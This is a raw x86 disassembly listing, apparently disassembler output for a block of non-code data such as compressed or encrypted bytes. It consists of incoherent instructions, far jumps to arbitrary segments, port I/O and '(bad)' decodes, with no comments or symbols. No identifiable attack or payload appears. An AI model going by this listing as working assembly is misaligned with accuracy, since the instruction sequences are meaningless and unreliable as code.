  420e1c:	fwait
  420e1d:	addr16 mov ebp,0x8aecc5a2
  420e23:	hlt    
  420e24:	aaa    
  420e25:	sbb    eax,DWORD PTR [ecx+edi*4-0x5f]
  420e29:	jl     0x420e7f
  420e2b:	jmp    0x9c1e:0x8b0b37ec
  420e32:	inc    ecx
  420e33:	iret   
  420e34:	adc    eax,0x13fb5863
  420e3a:	mov    esp,0xee308213
  420e3f:	xor    DWORD PTR [edi-0x55bf07a],esi
  420e45:	aad    0xb9
  420e47:	fmul   QWORD PTR [esi-0x3c]
  420e4a:	push   esp
  420e4b:	cs push 0xffffffea
  420e4e:	aad    0x6f
  420e50:	addr16 loopne 0x420e71
  420e53:	lahf   
  420e54:	mov    DWORD PTR [edx],esp
  420e56:	stc    
  420e57:	scas   eax,DWORD PTR es:[edi]
  420e58:	pop    ebx
  420e59:	ja     0x420e4f
  420e5b:	enter  0xe05e,0x79
  420e5f:	imul   ah
  420e61:	pop    edx
  420e62:	inc    DWORD PTR [eax+0x1b99f88d]
  420e68:	fisubr DWORD PTR [esi+edi*2+0x5ef8daa8]
	...
  420e77:	add    BYTE PTR [eax],al
  420e79:	add    BYTE PTR [eax-0x77],bh
  420e7c:	hlt    
  420e7d:	mov    al,0xf5
  420e7f:	std    
  420e80:	jl     0x420e4b
  420e82:	xor    dl,0x39
  420e85:	jg     0x420e20
  420e87:	in     eax,dx
  420e88:	in     eax,dx
  420e89:	sbb    edi,esp
  420e8b:	mov    al,BYTE PTR [ecx]
  420e8d:	add    ch,bh
  420e8f:	add    DWORD PTR [eax],eax
  420e91:	add    BYTE PTR [ebp+edx*1-0x40b336f5],al
  420e98:	jne    0x420eb3
  420e9a:	stos   BYTE PTR es:[edi],al
  420e9b:	retf   
  420e9c:	std    
  420e9d:	loopne 0x420efc
  420e9f:	adc    ecx,edx
  420ea1:	mov    edx,0xf16a54aa
  420ea6:	push   cs
  420ea7:	pop    edi
  420ea8:	adc    al,0xd9
  420eaa:	(bad)  
  420eab:	cmp    dl,cl
  420ead:	loop   0x420edd
  420eaf:	fidiv  WORD PTR [ecx]
  420eb1:	sti    
  420eb2:	aaa    
  420eb3:	or     ch,BYTE PTR [ecx-0x26]
  420eb6:	jp     0x420f1f
  420eb8:	ret    
  420eb9:	inc    ebx
  420eba:	aas    
  420ebb:	out    0x85,al
  420ebd:	push   edx
  420ebe:	xchg   ebx,eax
  420ebf:	enter  0x48c5,0xbe
  420ec3:	aaa    
  420ec4:	xor    DWORD PTR [edi+eiz*4-0x3c],ecx
  420ec8:	jbe    0x420e67
  420eca:	pop    ds
  420ecb:	clc    
  420ecc:	retf   0xfb10
  420ecf:	add    BYTE PTR [ebx],al
  420ed1:	outs   dx,BYTE PTR ds:[esi]
  420ed2:	mov    cl,0xcb
  420ed4:	push   ecx
  420ed5:	jge    0x420ebe
  420ed7:	mov    al,ds:0x32b2841f
  420edc:	jecxz  0x420f33
  420ede:	jp     0x420efe
  420ee0:	pop    ebp
  420ee1:	xor    cl,BYTE PTR [edx-0x1c]
  420ee4:	or     BYTE PTR [ebp-0x6f0e4d99],0x58
  420eeb:	dec    esi
  420eec:	mov    ah,0x17
  420eee:	jae    0x420eab
  420ef0:	cmp    bl,ch
  420ef2:	call   FWORD PTR [edx+0x16d31395]
  420ef8:	push   ds
  420ef9:	cmp    BYTE PTR ds:0xb5722a33,ch
  420eff:	push   edi
  420f00:	(bad)  
  420f01:	daa    
  420f02:	ins    DWORD PTR es:[edi],dx
  420f03:	mov    WORD PTR [ebp+0x55],es
  420f06:	and    DWORD PTR [edi],0x1a4f1d90
  420f0c:	cmp    bl,BYTE PTR [ebx+0x4678b0a0]
  420f12:	cs cmp ebx,ecx
  420f15:	or     eax,0x90a6099b
  420f1a:	pop    ecx
  420f1b:	push   ebp
  420f1c:	sub    ecx,edx
  420f1e:	in     eax,dx
  420f1f:	sbb    BYTE PTR [ebp-0x2c42e5a6],ch
  420f25:	(bad)  
  420f26:	adc    BYTE PTR [esi-0x79],bl
  420f29:	into   
  420f2a:	jns    0x420f7b
  420f2c:	cmp    ebp,ecx
  420f2e:	push   edx
  420f2f:	mov    dl,0xc5
  420f31:	add    DWORD PTR [eax+0x6e],esp
  420f34:	mov    BYTE PTR [eax-0x66ded2d3],al
  420f3a:	pop    edi
  420f3b:	popf   
  420f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f3d:	lods   al,BYTE PTR ds:[esi]
  420f3e:	mov    al,0x62
  420f40:	xchg   BYTE PTR [esi],ah
  420f42:	xor    BYTE PTR [ebx+0xc],ch
  420f45:	add    eax,0xaf711f93
  420f4a:	dec    ecx
  420f4b:	bound  esi,QWORD PTR [eax]
  420f4d:	add    eax,0xe2e72844
  420f52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f53:	sub    dl,BYTE PTR [ecx+0x4b]
  420f56:	jb     0x420fae
  420f58:	inc    eax
  420f59:	ins    BYTE PTR es:[edi],dx
  420f5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f5b:	jb     0x420fca
  420f5d:	sbb    dh,dh
  420f5f:	push   ecx
  420f60:	fcom   QWORD PTR [esi+0x7855d150]
  420f66:	mov    cs,WORD PTR [edi+0x50]
  420f69:	xchg   esp,eax
  420f6a:	dec    eax
  420f6b:	fdiv   QWORD PTR [esi+0x4f35c2e3]
  420f71:	test   DWORD PTR [edi+0x2c],eax
  420f74:	gs inc ecx
  420f76:	je     0x420f1f
  420f78:	mov    edi,0x5942397
  420f7d:	mov    eax,0xebb7bc9e
  420f82:	mov    esi,0x3ccd8897
  420f87:	in     al,dx
  420f88:	mov    bh,BYTE PTR [eax]
  420f8a:	jnp    0x420fc1
  420f8c:	aam    0xde
  420f8e:	popf   
  420f8f:	inc    esp
  420f90:	and    ebx,ecx
  420f92:	idiv   DWORD PTR [ebx+esi*8-0x26dabb61]
  420f99:	or     bl,BYTE PTR [ecx]
  420f9b:	paddusw mm7,mm2
  420f9e:	les    ebp,FWORD PTR [esp+edi*8+0x5c]
  420fa2:	jg     0x420fc6
  420fa4:	pop    es
  420fa5:	sbb    eax,0x6b37516f
  420faa:	fxch   st(1)
  420fac:	add    DWORD PTR [eax],edi
  420fae:	in     al,dx
  420faf:	and    cl,BYTE PTR [esi-0x40]
  420fb2:	int    0x9f
  420fb4:	dec    esi
  420fb5:	or     BYTE PTR [eax+0x6f],bl
  420fb8:	add    edx,DWORD PTR [eax]
  420fba:	sbb    al,dh
  420fbc:	pop    ebx
  420fbd:	sbb    eax,0xa8c67a05
  420fc2:	ds mov bl,0xe8
  420fc5:	iret   
  420fc6:	es jecxz 0x420fd6
  420fc9:	push   edi
  420fca:	out    dx,eax
  420fcb:	loopne 0x42102c
  420fcd:	mov    al,0xb0
  420fcf:	out    dx,eax
  420fd0:	arpl   WORD PTR [edi+0x1991c221],cx
  420fd6:	imul   ebp,DWORD PTR [ecx],0x72b85b29
  420fdc:	cmp    BYTE PTR [ecx],ah
  420fde:	pusha  
  420fdf:	sbb    WORD PTR [ecx+0x4c],bx
  420fe3:	sbb    DWORD PTR [edi+0x7b],ecx
  420fe6:	mov    esp,0xb9c08d2e
  420feb:	repnz daa 
  420fed:	or     DWORD PTR [eax],0x2c0f317f
  420ff3:	pop    ebp
  420ff4:	jl     0x421035
  420ff6:	cmp    BYTE PTR [ecx+0x28],cl
  420ff9:	add    eax,0x87bbc503
  420ffe:	outs   dx,DWORD PTR ds:[esi]
  420fff:	bound  esp,QWORD PTR [esi-0x4966ba49]
  421005:	aaa    
  421006:	mov    eax,ds:0x3e6c0775
  42100b:	stos   DWORD PTR es:[edi],eax
  42100c:	jnp    0x420ff8
  42100e:	mov    edi,0xff9dac81
  421013:	lods   al,BYTE PTR ds:[esi]
  421014:	int    0x7
  421016:	xor    bh,al
  421018:	outs   dx,DWORD PTR ds:[esi]
  421019:	sbb    ebp,esi
  42101b:	popa   
  42101c:	les    esp,FWORD PTR [esi]
  42101e:	or     esi,esi
  421020:	rcr    BYTE PTR [edi-0x3e],1
  421023:	jnp    0x421093
  421025:	or     BYTE PTR [eax-0x57],ah
  421028:	dec    ebx
  421029:	jl     0x420fde
  42102b:	popa   
  42102c:	mov    dh,0x32
  42102e:	out    0xe9,al
  421030:	sub    ebp,eax
  421032:	adc    eax,DWORD PTR [ebp-0x11]
  421035:	sub    BYTE PTR [edi+edi*1+0x20],dl
  421039:	mov    edx,0x8418be2d
  42103e:	and    esi,DWORD PTR [eax]
  421040:	imul   edx,DWORD PTR [eax-0x7d2fde7b],0x52
  421047:	sar    BYTE PTR [esp+eax*4],1
  42104a:	stos   DWORD PTR es:[edi],eax
  42104b:	mov    ds:0xd1b9adcb,eax
  421050:	into   
  421051:	dec    ebp
  421052:	inc    esp
  421053:	shrd   DWORD PTR [ebx+0x56],esi,cl
  421057:	repz or eax,0x2b2f0803
  42105d:	mov    edx,0x530ac69f
  421062:	cmp    BYTE PTR [eax+edx*1-0x7d],bh
  421066:	cmp    ah,BYTE PTR ds:0xb3ffde18
  42106c:	stc    
  42106d:	pop    esp
  42106e:	les    ebp,FWORD PTR [ecx-0x32]
  421071:	mov    BYTE PTR [edx],bh
  421073:	xchg   ecx,eax
  421074:	jno    0x421079
  421076:	and    eax,0xee85dbaf
  42107b:	call   0xc386:0x1c787690
  421082:	push   ecx
  421083:	iret   
  421084:	sbb    bh,ah
  421086:	xor    ebx,DWORD PTR ds:0xd13b1066
  42108c:	in     eax,0xe7
  42108e:	mov    ds:0x0,al
  421093:	add    BYTE PTR [eax],al
  421095:	add    BYTE PTR [eax],al
  421097:	add    BYTE PTR [eax],al
  421099:	add    BYTE PTR [edx+ecx*4-0x49],bl
  42109d:	imul   esi,edi,0x7f
  4210a0:	fdivr  QWORD PTR [edi+0x2b60ebfc]
  4210a6:	jg     0x4210f1
  4210a8:	mov    ecx,DWORD PTR [ecx+edi*8-0x2fffe74]
  4210af:	add    DWORD PTR [eax],eax
  4210b1:	add    bl,ch
  4210b3:	mov    edi,0x118c7dcd
  4210b8:	dec    ecx
  4210b9:	ds std 
  4210bb:	xchg   esp,eax
  4210bc:	push   ecx
  4210bd:	inc    ebp
  4210be:	int3   
  4210bf:	sar    DWORD PTR [edi],0xa5
  4210c2:	push   cs
  4210c3:	loop   0x4210cd
  4210c5:	arpl   WORD PTR [ebx],dx
  4210c7:	push   0xffffffaf
  4210c9:	or     dh,BYTE PTR [ecx-0x60]
  4210cc:	dec    ecx
  4210cd:	clc    
  4210ce:	adc    eax,0xbe5fe536
  4210d3:	inc    edi
  4210d4:	and    ecx,edi
  4210d6:	cdq    
  4210d7:	out    0xf4,al
  4210d9:	and    ecx,edx
  4210db:	dec    ecx
  4210dc:	mov    edi,0xb0dc1f2a
  4210e1:	xchg   ebx,eax
  4210e2:	or     al,0xd2
  4210e4:	jl     0x421103
  4210e6:	sbb    ecx,eax
  4210e8:	mov    ds:0xcd019b1,eax
  4210ed:	rol    ch,0xf7
  4210f0:	retf   
  4210f1:	ds cmp al,0x85
  4210f4:	xchg   ebx,eax
  4210f5:	sub    edi,edx
  4210f7:	(bad)  
  4210f9:	xor    eax,DWORD PTR [ebx]
  4210fb:	mov    ch,0x2f
  4210fd:	xchg   ebp,eax
  4210fe:	arpl   WORD PTR [ecx],si
  421100:	pusha  
  421101:	mov    ebp,0x795e4e12
  421106:	es or  al,0xaa
  421109:	ret    0x83e2
  42110c:	out    dx,al
  42110d:	test   al,0x2b
  42110f:	outs   dx,DWORD PTR ds:[esi]
  421110:	cdq    
  421111:	sub    eax,0xa9275928
  421116:	cmp    eax,0x845d566d
  42111b:	adc    ecx,DWORD PTR [ecx-0x315d2915]
  421121:	ficom  DWORD PTR [edx]
  421123:	jmp    0xd6f2:0xd1f3801e
  42112a:	sub    al,0x12
  42112c:	cdq    
  42112d:	aad    0x45
  42112f:	mov    edi,0xd84d1400
  421134:	(bad)  
  421135:	mov    al,ds:0x9c673b97
  42113a:	js     0x4210e5
  42113c:	mov    bl,0x8e
  42113e:	jg     0x4211a7
  421140:	ins    DWORD PTR es:[edi],dx
  421141:	fcomp  DWORD PTR [eax]
  421143:	xor    bl,cl
  421145:	icebp  
  421146:	xor    al,0xd
  421148:	mov    esp,DWORD PTR [edx]
  42114a:	cmp    esp,ebp
  42114c:	enter  0xd838,0x75
  421150:	mov    cl,0xcb
  421152:	add    ch,al
  421154:	or     al,0x29
  421156:	xchg   DWORD PTR [ebp+ebp*4+0x5d],edx
  42115a:	icebp  
  42115b:	lock shl DWORD PTR [eax-0x15c8f90e],1
  421162:	mov    dl,0x99
  421164:	adc    DWORD PTR [edi+0xf],ecx
  421167:	dec    ebx
  421168:	and    ebx,DWORD PTR [ebx]
  42116a:	test   eax,0x496a5063
  42116f:	adc    al,BYTE PTR [edx+0x66]
  421172:	jg     0x421123
  421174:	fisttp QWORD PTR [edi+esi*4+0x35]
  421178:	xchg   DWORD PTR [ecx+esi*8],ecx
  42117b:	ds fsubr st(4),st
  42117f:	loope  0x421158
  421181:	push   edx
  421182:	loop   0x4211a8
  421184:	xor    edx,0xe110a671
  42118a:	ins    DWORD PTR es:[edi],dx
  42118b:	and    eax,0xdc04eaca
  421190:	lea    eax,[ebp+0x6fe950bc]
  421196:	pop    ebx
  421197:	sar    BYTE PTR [ecx],1
  421199:	lahf   
  42119a:	dec    edx
  42119b:	int3   
  42119c:	in     eax,0x7f
  42119e:	dec    edx
  42119f:	fsub   st(7),st
  4211a1:	mov    ecx,0x864ab280
  4211a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211a7:	pop    esi
  4211a8:	xchg   edx,eax
  4211a9:	in     al,dx
  4211aa:	call   0xf8c3:0x77e89c56
  4211b1:	test   DWORD PTR [ebx-0x75],esp
  4211b4:	push   ebx
  4211b5:	jns    0x4211be
  4211b7:	sbb    eax,0x224f0e45
  4211bc:	cdq    
  4211bd:	idiv   DWORD PTR [esi]
  4211bf:	inc    ebx
  4211c0:	or     BYTE PTR [edi],0x6
  4211c3:	popf   
  4211c4:	inc    edx
  4211c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211c6:	add    al,0x46
  4211c8:	inc    ecx
  4211c9:	mov    ecx,0x1b9802cb
  4211ce:	mov    ebp,0x8d1b3682
  4211d3:	repz jg 0x42116e
  4211d6:	in     al,0x17
  4211d8:	out    0xa8,eax
  4211da:	adc    dl,BYTE PTR gs:[ebx]
  4211dd:	ja     0x421199
  4211df:	dec    esp
  4211e0:	in     eax,0xa7
  4211e2:	inc    edx
  4211e3:	xlat   BYTE PTR ds:[ebx]
  4211e4:	mov    al,ds:0x821d70ab
  4211e9:	sbb    DWORD PTR [edi+0x36],0xa7c727dc
  4211f0:	lds    esp,FWORD PTR ds:0x2a576bdc
  4211f6:	xchg   ebp,eax
  4211f7:	mov    eax,0x1f5baaaa
  4211fc:	lods   al,BYTE PTR ds:[esi]
  4211fd:	ja     0x421218
  4211ff:	or     BYTE PTR [esi],0x24
  421202:	add    DWORD PTR [ecx-0x6a],ebx
  421205:	add    BYTE PTR [eax-0x7f],bl
  421208:	push   ds
  421209:	cmp    al,0x80
  42120b:	imul   esi,DWORD PTR [esi-0x3be1573e],0x221f6131
  421215:	fsubr  QWORD PTR [esi+edi*1+0x36]
  421219:	je     0x42120d
  42121b:	inc    ebx
  42121c:	(bad)  
  42121d:	pusha  
  42121e:	push   edi
  42121f:	push   edi
  421220:	std    
  421221:	jb     0x421249
  421223:	xchg   WORD PTR [edx+0x7c152341],cx
  42122a:	sub    edx,DWORD PTR [eax+esi*1]
  42122d:	inc    ebp
  42122e:	pop    esp
  42122f:	and    eax,0x5b61d97b
  421234:	outs   dx,DWORD PTR ds:[esi]
  421235:	xchg   edx,eax
  421236:	mov    esi,0xc71cf71d
  42123b:	add    eax,0xc5481701
  421240:	ins    BYTE PTR es:[edi],dx
  421241:	sub    BYTE PTR [esi+0x36],ch
  421244:	or     al,dh
  421246:	mov    eax,0x29322bad
  42124b:	or     al,0x52
  42124d:	retf   
  42124e:	xchg   edi,eax
  42124f:	push   0x98f1cc16
  421254:	cdq    
  421255:	popf   
  421256:	pop    es
  421257:	shr    dl,1
  421259:	push   eax
  42125a:	int3   
  42125b:	or     BYTE PTR [edx-0x40],cl
  42125e:	fs adc al,0xf8
  421261:	sub    eax,0xb1bd7a39
  421266:	push   esi
  421267:	nop
  421268:	test   al,0x42
  42126a:	cli    
  42126b:	mov    edx,0x2a2cb30c
  421270:	jmp    0x4212e2
  421272:	or     ah,BYTE PTR [ecx]
  421274:	mov    dl,0xe3
  421276:	cmp    esi,DWORD PTR [ecx-0x408babd1]
  42127c:	in     al,dx
  42127d:	mov    edx,0x11a6d0ac
  421282:	mov    al,ds:0x4a7a3730
  421287:	loopne 0x421268
  421289:	in     al,dx
  42128a:	sbb    DWORD PTR [edi],edi
  42128c:	mov    ebx,0xe01cf83c
  421291:	jno    0x421299
  421293:	out    0x85,al
  421295:	rcl    DWORD PTR [eax-0x4a],1
  421298:	xchg   edi,eax
  421299:	xor    eax,0x78ea1961
  42129e:	(bad)  
  42129f:	rcl    dh,1
  4212a1:	imul   esi,DWORD PTR [ecx],0x6feeb4f8
  4212a7:	pop    ecx
  4212a8:	mov    ds,WORD PTR [esi]
  4212aa:	lods   eax,DWORD PTR ds:[esi]
  4212ab:	mul    DWORD PTR [esi]
  4212ad:	push   cs
  4212ae:	xchg   ebx,eax
	...
  4212b7:	add    BYTE PTR [eax],al
  4212b9:	add    BYTE PTR [edi-0x402578e6],ah
  4212bf:	(bad)  
  4212c1:	jg     0x42132a
  4212c3:	pop    esp
  4212c4:	fstp   DWORD PTR [ecx+0x94510b]
  4212ca:	test   BYTE PTR [esi+0x1fd0001],0x0
  4212d1:	add    bl,dl
  4212d3:	sbb    dh,BYTE PTR [edx]
  4212d5:	xor    BYTE PTR [edi-0x6],al
  4212d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212d9:	mov    al,0xd3
  4212db:	clc    
  4212dc:	dec    edx
  4212dd:	hlt    
  4212de:	imul   ebx,DWORD PTR ds:0xe483d27b,0xffffffee
  4212e5:	popa   
  4212e6:	fisttp QWORD PTR [ebp+0x61fad61c]
  4212ec:	jae    0x4212dd
  4212ee:	iret   
  4212ef:	inc    ecx
  4212f0:	cs ret 0x7cf9
  4212f4:	ins    BYTE PTR es:[edi],dx
  4212f5:	push   ebx
  4212f6:	ins    DWORD PTR es:[edi],dx
  4212f7:	inc    DWORD PTR [ebp+0x4cca2b0c]
  4212fd:	xchg   esp,eax
  4212fe:	or     al,0x40
  421300:	cmp    bl,BYTE PTR ds:0x63e94457
  421306:	mov    bh,0x80
  421308:	loop   0x42137b
  42130a:	mul    DWORD PTR [ecx]
  42130c:	pop    edi
  42130d:	sbb    DWORD PTR [eax+0x40],ebx
  421310:	addr16 inc ebx
  421312:	sbb    eax,0xe6a0c7a8
  421317:	or     eax,0x9961ed73
  42131c:	loop   0x4212e2
  42131e:	sub    ecx,DWORD PTR [esi+0x7d93c08d]
  421324:	pop    esp
  421325:	add    bh,BYTE PTR [ebp+0x45]
  421328:	and    DWORD PTR [ebx+0x4c],0x62
  42132c:	out    0x31,al
  42132e:	inc    esi
  42132f:	dec    eax
  421330:	fild   WORD PTR [esi-0x54]
  421333:	pop    esi
  421334:	test   DWORD PTR [esi],edi
  421336:	mov    ebp,ebp
  421338:	and    bh,bh
  42133a:	fmul   st(7),st
  42133c:	outs   dx,DWORD PTR fs:[esi]
  42133e:	xor    al,0x2d
  421340:	push   0xf1fcd0b6
  421345:	jo     0x42132d
  421347:	or     al,0x8b
  421349:	shr    BYTE PTR [ebx-0xd4ff55],1
  42134f:	cmp    al,0xc8
  421351:	xchg   esp,eax
  421352:	sbb    bh,BYTE PTR [eax+0x41e23439]
  421358:	imul   esi,eax,0x74
  42135b:	out    0x33,al
  42135d:	dec    edi
  42135e:	int    0xa2
  421360:	jmp    0xc4ded350
  421365:	push   eax
  421366:	popf   
  421367:	add    dl,BYTE PTR [esp+eax*4+0x3a1c47ff]
  42136e:	or     DWORD PTR [edi],esp
  421370:	bound  esi,QWORD PTR [eax+0x55]
  421373:	jg     0x421313
  421375:	dec    ebx
  421376:	(bad)  
  421377:	stos   DWORD PTR es:[edi],eax
  421378:	pusha  
  421379:	jmp    0x42134b
  42137b:	mov    ds:0x29e96614,eax
  421380:	push   0xebdfb20b
  421385:	xor    DWORD PTR [ecx],ecx
  421387:	mov    bh,0x3c
  421389:	ins    BYTE PTR es:[edi],dx
  42138a:	mov    ds:0x855a9a96,eax
  42138f:	fwait
  421390:	rol    BYTE PTR [si-0x4a88],cl
  421395:	mov    esi,0x7a10c14f
  42139a:	jno    0x4213e7
  42139c:	cmp    ebp,DWORD PTR [ebx+esi*1]
  42139f:	cmp    bh,BYTE PTR [edx-0xb]
  4213a2:	outs   dx,DWORD PTR ds:[esi]
  4213a3:	pop    ebp
  4213a4:	jmp    0x4213ac
  4213a6:	hlt    
  4213a7:	fs mov ah,0xdf
  4213aa:	ins    DWORD PTR es:[edi],dx
  4213ab:	(bad)  
  4213ac:	loop   0x421389
  4213ae:	int3   
  4213af:	fwait
  4213b0:	inc    ebp
  4213b1:	test   BYTE PTR [ecx],bl
  4213b3:	sbb    eax,0xfbd89870
  4213b8:	mov    bh,0xde
  4213ba:	and    al,bl
  4213bc:	aad    0xb9
  4213be:	xor    esi,ebx
  4213c0:	jb     0x42140f
  4213c2:	sti    
  4213c3:	inc    edx
  4213c4:	stos   DWORD PTR es:[edi],eax
  4213c5:	(bad)  
  4213c6:	shl    edi,0xd3
  4213c9:	cmc    
  4213ca:	adc    edi,DWORD PTR [eax]
  4213cc:	shl    DWORD PTR [eax-0x71],cl
  4213cf:	sbb    edx,DWORD PTR [ecx-0x4e]
  4213d2:	pop    ss
  4213d3:	add    BYTE PTR [ebp-0x36],0xde
  4213d7:	lock gs inc eax
  4213da:	xchg   DWORD PTR [edi+0x3],edx
  4213dd:	in     al,0xf1
  4213df:	pop    ss
  4213e0:	jo     0x42137b
  4213e2:	mov    ebp,0x9da08e57
  4213e7:	mov    al,ds:0xca5279d5
  4213ec:	(bad)
  4213ef:	(bad)  
  4213f0:	mov    esi,0xf83ec5e0
  4213f5:	das    
  4213f6:	xor    BYTE PTR [ebx+ebp*8+0xfd76ef7],al
  4213fd:	popf   
  4213fe:	sbb    esp,DWORD PTR [edx+0x20918667]
  421404:	cli    
  421405:	into   
  421406:	stos   BYTE PTR es:[edi],al
  421407:	mov    ecx,0x149e5ddc
  42140c:	mov    bh,0x25
  42140e:	push   ss
  42140f:	mov    ch,0x3f
  421411:	sub    eax,0x7ebee349
  421416:	popf   
  421417:	cmp    ax,0x4a48
  42141b:	mov    dl,0xea
  42141d:	xchg   ebx,eax
  42141e:	clc    
  42141f:	loope  0x4213b5
  421421:	cmp    eax,0x9d595415
  421426:	mov    DWORD PTR [ebx-0x67],esp
  421429:	or     al,0x28
  42142b:	mov    ds:0xebc7a4de,al
  421430:	sub    DWORD PTR [esi+0x27dcaeb3],esp
  421436:	mov    ecx,0x5357827b
  42143b:	mov    ch,0xf2
  42143d:	data16 cmp al,0x5b
  421440:	cmp    BYTE PTR [ebp*4+0x1638f821],bh
  421447:	cmp    ebp,edx
  421449:	fld    TBYTE PTR [ebx]
  42144b:	stos   DWORD PTR es:[edi],eax
  42144c:	fidivr DWORD PTR [ebp-0x5c]
  42144f:	pop    ecx
  421450:	mov    edx,0x9b1a2780
  421455:	and    DWORD PTR [edx+0x6c3e691a],ecx
  42145b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42145c:	mov    ds:0x6167d4a0,al
  421461:	inc    esi
  421462:	(bad)  
  421463:	and    BYTE PTR [edi-0x2e],dl
  421466:	into   
  421467:	mov    bh,0xe4
  421469:	rcl    DWORD PTR [edi+edi*8-0x4a],cl
  42146d:	jnp    0x42147a
  42146f:	jmp    0xe22c:0xbb724a29
  421476:	adc    esi,DWORD PTR [eax]
  421478:	jno    0x4214c4
  42147a:	aaa    
  42147b:	and    eax,0x2eddeb72
  421480:	xor    eax,ecx
  421482:	xor    dh,cl
  421484:	cmp    ebx,eax
  421486:	fdivrp st(7),st
  421488:	push   eax
  421489:	fwait
  42148a:	pop    ebp
  42148b:	jmp    0xe707:0x5727369c
  421492:	test   eax,0x583b9dbf
  421497:	cmp    dl,BYTE PTR [eax-0x54]
  42149a:	cld    
  42149b:	mov    edi,0x3a124cab
  4214a0:	adc    BYTE PTR es:[ebp+0x79117d3e],ch
  4214a7:	add    dl,BYTE PTR [esi+0x17e76266]
  4214ad:	cs shr esp,cl
  4214b0:	cmp    DWORD PTR [ecx+0x5083308a],edx
  4214b6:	fwait
  4214b7:	cmp    esp,DWORD PTR [ebx+0x23714f57]
  4214bd:	xor    edx,ecx
  4214bf:	fidivr WORD PTR [ebp+0x7b]
  4214c2:	lods   eax,DWORD PTR fs:[esi]
  4214c4:	(bad)  
  4214c5:	jb     0x4214c0
  4214c7:	and    esp,DWORD PTR [eax]
  4214c9:	jne    0x421503
  4214cb:	ja     0x421519
  4214cd:	out    0x6f,eax
	...
  4214d7:	add    BYTE PTR [eax],al
  4214d9:	add    BYTE PTR [ebp-0x15b01f1],bl
  4214df:	cmc    
  4214e0:	fistp  QWORD PTR [edi]
  4214e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214e3:	fidiv  DWORD PTR [ebp+0x34]
  4214e6:	cmp    cl,0xcb
  4214e9:	mov    al,ds:0x190f3
  4214ee:	std    
  4214ef:	add    DWORD PTR [eax],eax
  4214f1:	add    bh,bh
  4214f3:	adc    ecx,edx
  4214f5:	pop    ecx
  4214f6:	xchg   ebp,eax
  4214f7:	stos   BYTE PTR es:[edi],al
  4214f8:	cwde   
  4214f9:	push   0xee370c33
  4214fe:	outs   dx,DWORD PTR ds:[esi]
  4214ff:	xchg   ecx,eax
  421500:	xchg   esp,eax
  421501:	out    0x50,eax
  421503:	cwde   
  421504:	sub    DWORD PTR [ebx],esp
  421506:	xor    BYTE PTR [ebx+0x25],ch
  421509:	lods   al,BYTE PTR ds:[esi]
  42150a:	enter  0x664,0x51
  42150e:	jg     0x421515
  421510:	call   0x247295a8
  421515:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421516:	cdq    
  421517:	push   ecx
  421518:	xchg   DWORD PTR [ebx-0x1e],esp
  42151b:	sti    
  42151c:	stc    
  42151d:	xor    al,0x67
  42151f:	inc    ecx
  421520:	aas    
  421521:	mov    ch,0xc4
  421523:	das    
  421524:	sahf   
  421525:	(bad)  
  421526:	mov    edx,0x69915fc3
  42152b:	addr16 retf 
  42152d:	xor    eax,0x5f0be4b3
  421532:	pop    ss
  421533:	shl    DWORD PTR [ecx+0xe66f7c1],0xf2
  42153a:	pop    edi
  42153b:	pop    esp
  42153c:	imul   edi,DWORD PTR [eax+0x732fc260],0x3b
  421543:	push   ds
  421544:	scas   eax,DWORD PTR es:[edi]
  421545:	mov    edi,0x3688724
  42154a:	les    edi,FWORD PTR [ecx]
  42154c:	outs   dx,DWORD PTR ds:[esi]
  42154d:	vmread DWORD PTR [ebp+0x78ce889f],edi
  421554:	push   ss
  421555:	iret   
  421556:	inc    esp
  421557:	popf   
  421558:	(bad)  
  421559:	inc    DWORD PTR [edx+0x1108f3cf]
  42155f:	or     BYTE PTR [edi-0x492c7e12],dh
  421565:	pop    esi
  421566:	sbb    cl,dl
  421568:	aam    0xf6
  42156a:	push   0xde7cfd4c
  42156f:	xchg   edi,eax
  421570:	jnp    0x42159d
  421572:	hlt    
  421573:	in     eax,0xc3
  421575:	hlt    
  421576:	pop    ss
  421577:	mov    eax,ds:0xe395a2f6
  42157c:	rol    ah,cl
  42157e:	out    0x6d,eax
  421580:	popf   
  421581:	lds    esi,FWORD PTR [esi-0x13]
  421584:	mov    bl,0x99
  421586:	mov    BYTE PTR [esi+ebp*8+0x61],bl
  42158a:	or     BYTE PTR [ebp-0x19],bl
  42158d:	push   0x2466531a
  421592:	pop    esp
  421593:	retf   0x5a5e
  421596:	shr    esp,0x2f
  421599:	jnp    0x4215b9
  42159b:	jl     0x421584
  42159d:	pop    ebx
  42159e:	push   ebp
  42159f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4215a0:	sub    DWORD PTR ds:0x4113c137,esp
  4215a6:	fwait
  4215a7:	std    
  4215a8:	test   DWORD PTR [eax],ebp
  4215aa:	jae    0x421614
  4215ac:	callw  0xfb3
  4215b0:	push   0x953f1c54
  4215b5:	adc    al,0x5
  4215b7:	call   0xc5b2501
  4215bc:	cmp    edi,DWORD PTR [esp+ecx*8+0x49]
  4215c0:	rcl    BYTE PTR [ebx],0xd4
  4215c3:	push   0xffffffc8
  4215c5:	inc    ebp
  4215c6:	out    0x49,al
  4215c8:	ss lock sti 
  4215cb:	pushf  
  4215cc:	mov    edi,0x1b2fbb41
  4215d1:	lods   eax,DWORD PTR ds:[esi]
  4215d2:	jns    0x42164b
  4215d4:	jo     0x42159b
  4215d6:	add    ah,0x4d
  4215d9:	jb     0x4215d7
  4215db:	jge    0x42164c
  4215dd:	push   ebx
  4215de:	iret   
  4215df:	in     al,dx
  4215e0:	stos   DWORD PTR es:[edi],eax
  4215e1:	arpl   ax,ax
  4215e3:	push   esp
  4215e4:	dec    ebx
  4215e5:	inc    ebp
  4215e6:	idiv   DWORD PTR [ebx]
  4215e8:	mov    BYTE PTR [esp+ebx*8-0x3c70b1e5],cl
  4215ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215f0:	outs   dx,DWORD PTR ds:[esi]
  4215f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
